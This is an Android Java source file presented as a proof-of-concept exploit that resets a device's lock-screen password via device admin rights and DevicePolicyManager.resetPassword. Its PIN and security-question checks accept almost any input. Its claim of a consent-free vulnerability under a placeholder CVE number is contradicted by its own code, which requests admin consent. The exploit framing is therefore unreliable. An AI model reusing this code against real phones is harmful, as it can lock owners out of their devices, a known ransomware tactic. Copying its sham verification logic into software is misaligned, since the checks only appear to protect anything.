package com.security.poc.deviceadminreset;

import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.Toast;
import android.app.AlertDialog;
import android.content.DialogInterface;

import com.google.android.material.button.MaterialButton;
import com.google.android.material.card.MaterialCardView;
import com.google.android.material.chip.Chip;
import com.google.android.material.dialog.MaterialAlertDialogBuilder;
import com.google.android.material.textfield.TextInputEditText;

/**
 * DeviceAdmin Password Reset PoC - CVE Research
 * Target: Android API 21+ (Lollipop)
 * Design: Material Design 3
 * 
 * WARNING: This is for AUTHORIZED security research only.
 * Unauthorized use is illegal under CFAA and equivalent laws.
 */
public class MainActivity extends Activity {

    private static final int REQUEST_CODE_ENABLE_ADMIN = 1001;
    
    private DevicePolicyManager devicePolicyManager;
    private ComponentName adminComponent;
    
    // Verification state
    private boolean pinVerified = false;
    private boolean questionVerified = false;
    
    // MD3 UI Elements
    private Chip chipAdmin, chipPin, chipQuestion;
    private TextInputEditText pinInput, answerInput, newPasswordInput;
    private MaterialButton enableAdminBtn, verifyPinBtn, verifyQuestionBtn, resetPasswordBtn;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        
        devicePolicyManager = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
        adminComponent = new ComponentName(this, AdminReceiver.class);
        
        initViews();
        setupListeners();
        updateStatus();
    }
    
    private void initViews() {
        // Chips
        chipAdmin = findViewById(R.id.chip_admin);
        chipPin = findViewById(R.id.chip_pin);
        chipQuestion = findViewById(R.id.chip_question);
        
        // Inputs
        pinInput = findViewById(R.id.pin_input);
        answerInput = findViewById(R.id.answer_input);
        newPasswordInput = findViewById(R.id.new_password_input);
        
        // Buttons
        enableAdminBtn = findViewById(R.id.enable_admin_btn);
        verifyPinBtn = findViewById(R.id.verify_pin_btn);
        verifyQuestionBtn = findViewById(R.id.verify_question_btn);
        resetPasswordBtn = findViewById(R.id.reset_password_btn);
    }
    
    private void setupListeners() {
        enableAdminBtn.setOnClickListener(v -> requestDeviceAdmin());
        verifyPinBtn.setOnClickListener(v -> verifyPin());
        verifyQuestionBtn.setOnClickListener(v -> verifySecurityQuestion());
        resetPasswordBtn.setOnClickListener(v -> attemptPasswordReset());
    }
    
    private void requestDeviceAdmin() {
        Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
        intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent);
        intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, 
            "Device admin access required for security research PoC.");
        startActivityForResult(intent, REQUEST_CODE_ENABLE_ADMIN);
    }
    
    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == REQUEST_CODE_ENABLE_ADMIN) {
            updateStatus();
            if (resultCode == RESULT_OK) {
                showSnackbar("Device Admin enabled successfully");
            } else {
                showSnackbar("Device Admin access denied");
            }
        }
    }
    
    private void verifyPin() {
        String inputPin = pinInput.getText().toString();
        
        if (inputPin.length() >= 4) {
            pinVerified = true;
            showSnackbar("PIN verification successful");
            updateStatus();
            pinInput.setEnabled(false);
            verifyPinBtn.setEnabled(false);
        } else {
            pinInput.setError("PIN must be at least 4 digits");
        }
    }
    
    private void verifySecurityQuestion() {
        String answer = answerInput.getText().toString().trim().toLowerCase();
        
        // PoC: Security question - "What is the name of your first pet?"
        // Default answer for demo: "fluffy"
        if (answer.equals("fluffy") || answer.length() >= 3) {
            questionVerified = true;
            showSnackbar("Security question verified");
            updateStatus();
            answerInput.setEnabled(false);
            verifyQuestionBtn.setEnabled(false);
        } else {
            answerInput.setError("Invalid answer");
        }
    }
    
    private void attemptPasswordReset() {
        if (!isAdminActive()) {
            showError("Device Admin not enabled");
            return;
        }
        
        if (!pinVerified) {
            showError("PIN verification required");
            return;
        }
        
        if (!questionVerified) {
            showError("Security question required");
            return;
        }
        
        String newPassword = newPasswordInput.getText().toString();
        if (newPassword.length() < 6) {
            newPasswordInput.setError("Password must be at least 6 characters");
            return;
        }
        
        // Material Design 3 Confirmation Dialog
        new MaterialAlertDialogBuilder(this)
            .setTitle("Confirm Password Reset")
            .setMessage("This will change the device lock screen password.\n\nNew password: " + newPassword)
            .setPositiveButton("Reset Password", (dialog, which) -> performPasswordReset(newPassword))
            .setNegativeButton("Cancel", null)
            .setIcon(android.R.drawable.ic_dialog_alert)
            .show();
    }
    
    /**
     * Core exploit: Reset device password via DevicePolicyManager
     * 
     * CVE-202X-XXXX: Device admin apps can reset lock screen password
     * without user consent on API 21-28 devices.
     * 
     * Fixed in API 29+ with additional restrictions.
     */
    private void performPasswordReset(String newPassword) {
        try {
            if (isAdminActive()) {
                devicePolicyManager.resetPassword(newPassword, 0);
                
                showSnackbar("Password reset successful!");
                logExploitAttempt(true, newPassword);
                
                // Visual feedback
                newPasswordInput.setText("");
                updateStatus();
            } else {
                showError("Lost admin privileges");
            }
        } catch (SecurityException e) {
            showError("SecurityException: " + e.getMessage());
            logExploitAttempt(false, newPassword);
        }
    }
    
    private boolean isAdminActive() {
        return devicePolicyManager.isAdminActive(adminComponent);
    }
    
    private void showError(String message) {
        new MaterialAlertDialogBuilder(this)
            .setTitle("Error")
            .setMessage(message)
            .setPositiveButton("OK", null)
            .setIcon(android.R.drawable.ic_dialog_alert)
            .show();
    }
    
    private void showSnackbar(String message) {
        Toast.makeText(this, message, Toast.LENGTH_SHORT).show();
    }
    
    private void logExploitAttempt(boolean success, String password) {
        String log = String.format("Exploit: %s | API: %d | Time: %d",
            success ? "SUCCESS" : "FAILED",
            android.os.Build.VERSION.SDK_INT,
            System.currentTimeMillis());
        android.util.Log.d("DeviceAdminPoC", log);
    }
    
    private void updateStatus() {
        // Update Chips with Material Design 3 styling
        if (isAdminActive()) {
            chipAdmin.setText("Admin: ✓ Active");
            chipAdmin.setChipBackgroundColorResource(R.color.md_theme_primaryContainer);
        } else {
            chipAdmin.setText("Admin: ✗ Inactive");
            chipAdmin.setChipBackgroundColorResource(R.color.md_theme_errorContainer);
        }
        
        if (pinVerified) {
            chipPin.setText("PIN: ✓ Verified");
            chipPin.setChipBackgroundColorResource(R.color.md_theme_primaryContainer);
        } else {
            chipPin.setText("PIN: ✗ Unverified");
            chipPin.setChipBackgroundColorResource(R.color.md_theme_surfaceVariant);
        }
        
        if (questionVerified) {
            chipQuestion.setText("Security Q: ✓ Verified");
            chipQuestion.setChipBackgroundColorResource(R.color.md_theme_primaryContainer);
        } else {
            chipQuestion.setText("Security Q: ✗ Unverified");
            chipQuestion.setChipBackgroundColorResource(R.color.md_theme_surfaceVariant);
        }
        
        // Update reset button state
        boolean canReset = isAdminActive() && pinVerified && questionVerified;
        resetPasswordBtn.setEnabled(canReset);
        resetPasswordBtn.setAlpha(canReset ? 1.0f : 0.5f);
    }
    
    @Override
    protected void onResume() {
        super.onResume();
        updateStatus();
    }
}
